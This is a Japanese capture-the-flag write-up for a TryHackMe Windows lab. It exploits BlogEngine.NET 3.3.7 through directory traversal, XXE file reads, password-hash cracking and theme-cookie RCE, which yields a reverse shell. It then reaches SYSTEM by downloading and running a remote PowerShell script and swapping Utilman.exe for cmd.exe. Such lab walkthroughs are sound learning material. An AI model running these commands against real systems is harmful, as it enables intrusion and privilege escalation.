# Exfilibur CTF

https://tryhackme.com/room/exfilibur

## Enumeration

```shell
TARGET=10.48.158.25
sudo bash -c "echo $TARGET   exfil.thm >> /etc/hosts"
```

### ポートスキャン

```sh
sudo nmap -vv -Pn -p- $TARGET

PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 128
3389/tcp open  ms-wbt-server syn-ack ttl 128
```

```sh
sudo nmap -sV -Pn -p80,3389 $TARGET

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

HTTP, RDP のみ。

```sh
root@ip-10-48-124-200:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.48.158.25
+ Target Hostname:    exfil.thm
+ Target Port:        80
+ Start Time:         2026-03-02 01:15:07 (GMT0)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ Retrieved x-aspnet-version header: 4.0.30319
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server banner has changed from 'Microsoft-IIS/10.0' to 'Microsoft-HTTPAPI/2.0' which may suggest a WAF, load balancer or proxy is in place
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ 1707 items checked: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2026-03-02 01:15:10 (GMT0) (3 seconds)
---------------------------------------------------------------------------
```

### ディレクトリ列挙

blogを発見。

```sh
dirb http://$TARGET

---- Scanning URL: http://10.48.158.25/ ----
==> DIRECTORY: http://10.48.158.25/aspnet_client/                                                          
+ http://10.48.158.25/blog (CODE:200|SIZE:23547)                                                           
+ http://10.48.158.25/Blog (CODE:200|SIZE:23547)                                                           
                                                                                                           
---- Entering directory: http://10.48.158.25/aspnet_client/ ----
==> DIRECTORY: http://10.48.158.25/aspnet_client/system_web/                                               
                                                                                                           
---- Entering directory: http://10.48.158.25/aspnet_client/system_web/ ----
                                                                                                           
-----------------
END_TIME: Mon Mar  2 01:16:30 2026
DOWNLOADED: 13836 - FOUND: 2
```

```sh
$ cat robots.txt 
User-agent: *
Disallow: /Account/*.*
Disallow: /search
Disallow: /search.aspx
Disallow: /error404.aspx
Disallow: /archive
Disallow: /archive.aspx

#Remove the '#' character below and replace example.com with your own website address.
#sitemap: http://example.com/sitemap.axd 
# WebMatrix 1.0
```

## blogengine

BlogEngine.NET 3.3.7.0 には脆弱性が4件ある。  
RCEの2件は認証情報必要。

```sh
$ searchsploit BlogEngine NET 3.3.7  
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Executi | aspx/webapps/47010.py
BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal                          | aspx/webapps/47035.py
BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code Ex | aspx/webapps/47011.py
BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection                       | aspx/webapps/47014.py
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

### BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal

http://exfil.thm/blog/api/filemanager?path=/../../

```xml
This XML file does not appear to have any style information associated with it. The document tree is shown below.
<ArrayOfFileInstance xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2004/07/BlogEngine.Core.FileSystem">
<FileInstance>
<Created>3/2/2026 2:47:31 AM</Created>
<FileSize/>
<FileType>Directory</FileType>
<FullPath>~/App_Data/files/../..</FullPath>
<IsChecked>false</IsChecked>
<Name>...</Name>
...
```

http://exfil.thm/blog/api/filemanager?path=/../../App_Data/

```xml
...
<FileInstance>
<Created>2/5/2019 5:47:20 PM</Created>
<FileSize>5.47 kb</FileSize>
<FileType>File</FileType>
<FullPath>/../../App_Data/settings.xml</FullPath>
<IsChecked>false</IsChecked>
<Name>settings.xml</Name>
<SortOrder>21</SortOrder>
</FileInstance>
<FileInstance>
<Created>2/5/2019 5:47:20 PM</Created>
<FileSize>587.00 bytes</FileSize>
<FileType>File</FileType>
<FullPath>/../../App_Data/stopwords.txt</FullPath>
<IsChecked>false</IsChecked>
<Name>stopwords.txt</Name>
<SortOrder>22</SortOrder>
</FileInstance>
<FileInstance>
<Created>2/5/2019 5:47:20 PM</Created>
<FileSize>633.00 bytes</FileSize>
<FileType>File</FileType>
<FullPath>/../../App_Data/users.xml</FullPath>
<IsChecked>false</IsChecked>
<Name>users.xml</Name>
<SortOrder>23</SortOrder>
</FileInstance>
```

### BlogEngine.NET 3.3.6/3.3.7 - XML External Entity

C:/Windows/win.ini を取得できた。

```sh
$ python ./47014.py -r http://exfil.thm/blog -l 192.168.129.39 -p 1339
./CVE-2019-10718

Requesting C:/Windows/win.ini ...
10.48.135.41 - - [02/Mar/2026 13:29:03] "GET /ex.dtd HTTP/1.1" 200 -
10.48.135.41 - - [02/Mar/2026 13:29:03] "GET /X?;%20for%2016-bit%20app%20support%0D%0A[fonts]%0D%0A[extensions]%0D%0A[mci%20extensions]%0D%0A[files]%0D%0A[Mail]%0D%0AMAPI=1 HTTP/1.1" 200 -
                                                                            ─$ ls ./CVE-2019-10718     
C_Windows_win.ini

$ cat ./CVE-2019-10718/C_Windows_win.ini 
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1 
```

users.xml  
パスワードハッシュを取れたが・・・？

```sh
$ python ./47014.py -r http://exfil.thm/blog -l 192.168.129.39 -p 1339 -f 'C:/inetpub/wwwroot/blog/App_Data/users.xml'
./CVE-2019-10718

$ cat ./CVE-2019-10718/C_inetpub_wwwroot_blog_App_Data_users.xml 
<Users>
  <User>
    <UserName>Admin</UserName>
    <Password>[REDACTED]</Password>
    <Email>post@example.com</Email>
    <LastLoginTime>2007-12-05 20:46:40</LastLoginTime>
  </User>
  <!--
<User>
    <UserName>merlin</UserName>
    <Password></Password>
    <Email>mark@email.com</Email>
    <LastLoginTime>2023-08-11 10:58:51</LastLoginTime>
  </User>
-->
  <User>
    <UserName>guest</UserName>
    <Password>[REDACTED]</Password>
    <Email>guest@email.com</Email>
    <LastLoginTime>2023-08-12 08:47:51</LastLoginTime>
  </User>
</Users>
```

ハッシュ生成のソースコード  
https://github.com/BlogEngine/BlogEngine.NET/blob/95c84261ed94402f45094c1fda85afbbf6f4d833/BlogEngine/BlogEngine.Core/Helpers/Utils.cs#L722

```cs
public static string HashPassword(string plainMessage)
{
    var data = Encoding.UTF8.GetBytes(plainMessage);
    using (HashAlgorithm sha = new SHA256Managed())
    {
        sha.TransformFinalBlock(data, 0, data.Length);
        return Convert.ToBase64String(sha.Hash);
    }
}
```

guest のパスワードは判明したが、Adminは不明。

```py
import hashlib
import base64

target_hash = "[REDACTED]"
dict_file = "/usr/share/wordlists/rockyou.txt"

with open(dict_file, 'r', encoding='latin-1') as f:
    for line in f:
        password = line.strip()
        sha256 = hashlib.sha256(password.encode('utf-8')).digest()
        b64_hash = base64.b64encode(sha256).decode('utf-8')
        
        if b64_hash == target_hash:
            print(f"Found: {password}")
            break
```

guestでログインしたらドラフトのブログ記事があり、その中にパスワードが書かれていた。  
これを使って、Adminとしてログイン成功。

Adminの認証情報を入手したのでRCEを目指す。

###  'theme Cookie' Directory Traversal / Remote Code Execution

47010 は機能しなかった。

https://www.exploit-db.com/exploits/47011

```sh
$ python ./47011.py -t exfil.thm/blog -u Admin -p [REDACTED] -l 192.168.129.39:1337
/home/kali/ctf/exfil/./47011.py:139: SyntaxWarning: invalid escape sequence '\s'
  login_form = re.findall('<input\s+.*?name="(?P<name>.*?)"\s+.*?(?P<tag>\s+value="(?P<value>.*)")?\s/>', resp)
```

シェル取得成功。

```sh
$ nc -nlvp 1337
listening on [any] 1337 ...
connect to [192.168.129.39] from (UNKNOWN) [10.48.135.41] 50331
Microsoft Windows [Version 10.0.17763.4737]
(c) 2018 Microsoft Corporation. All rights reserved.
whoami
c:\windows\system32\inetsrv>whoami
exfilibur\merlin
```

## 権限昇格

SeImpersonatePrivilege が付いている。

```ps
c:\inetpub\wwwroot\blog>whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

msfvenom でexeを作って実行したら削除された。AVが動いている。  
PrintSpoofer なども削除される。

BlogのAdminと同じパスワードで、Usersディレクトリで発見したユーザーでRDP接続できた。

## RDP

権限はほぼない。

```ps
C:\Users\kingarthy>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

cmd.exe を Administrator として起動できるが、C:\Users 等へのアクセスは拒否されるというよく分からない状態。権限は元のものと異なる。

```ps
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeRestorePrivilege            Restore files and directories            Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```

分からずウォークスルーを見た。無効になっている権限を有効化する（！！？）

https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1

```sh
C:\Users\Public>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Public> IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.129.39:8000/EnableAllTokenPrivs.ps1');
PS C:\Users\Public> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeRestorePrivilege            Restore files and directories            Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

SeTakeOwnershipPrivilege権限が有効になったので、Utilmanをcmdに置き換える。

```sh
PS C:\Users\Public> takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "EXFILIBUR\kingarthy".

PS C:\Users\Public> icacls C:\Windows\System32\Utilman.exe /grant kingarthy:F
processed file: C:\Windows\System32\Utilman.exe
Successfully processed 1 files; Failed processing 0 files

PS C:\Users\Public> copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

ロック画面から簡単操作ボタンを押してSYSTEM昇格成功。

## 振り返り

- BlogEngineは、3つの異なる脆弱性を順番に使ってシェルを得る過程が非常に興味深かった。
- 権限有効化できるとは知らなった。画期的・・・！
- 他のウォークスルーを見たところ、AV回避に成功している人もいた。ただ、同じ方法を使っても最新の環境では検出されるため汎用性は低い。

## Tags

#tags:BlogEngine #tags:Windows
